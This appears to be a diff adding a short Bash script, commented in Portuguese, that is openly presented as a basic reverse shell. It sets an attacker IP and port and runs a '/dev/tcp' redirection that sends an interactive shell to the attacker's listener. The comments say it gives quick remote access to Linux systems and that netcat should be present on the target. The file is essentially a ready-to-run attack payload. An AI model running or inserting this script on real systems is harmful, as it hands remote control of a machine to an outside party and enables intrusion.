@@ -1,0 +1,28 @@
+#!/bin/bash
+#
+# =================================================================
+# Shell Reverso em Bash - Conexão Básica
+# =================================================================
+#
+# Descrição: Script simples de shell reverso usando Bash que estabelece
+# uma conexão TCP com o atacante.
+#
+# Quando usar: Para obter acesso remoto rápido a sistemas Linux.
+#
+# Como usar: Execute o script e inicie um listener na porta especificada.
+#
+# Pré-requisitos: Bash instalado e netcat disponível no sistema alvo.
+#
+# Observações: Método básico, facilmente detectado por sistemas de
+# detecção de intrusão. Use em redes confiáveis.
+#
+# =================================================================
+
+# Configuração do endereço IP e porta do atacante
+LHOST="192.168.1.100"  # MODIFIQUE: Endereço IP do seu servidor
+LPORT=4444            # MODIFIQUE: Porta de escuta do seu servidor
+
+# Estabelece conexão reversa
+# O comando bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 cria um shell interativo
+# que redireciona entrada, saída e erros para a conexão TCP
+bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
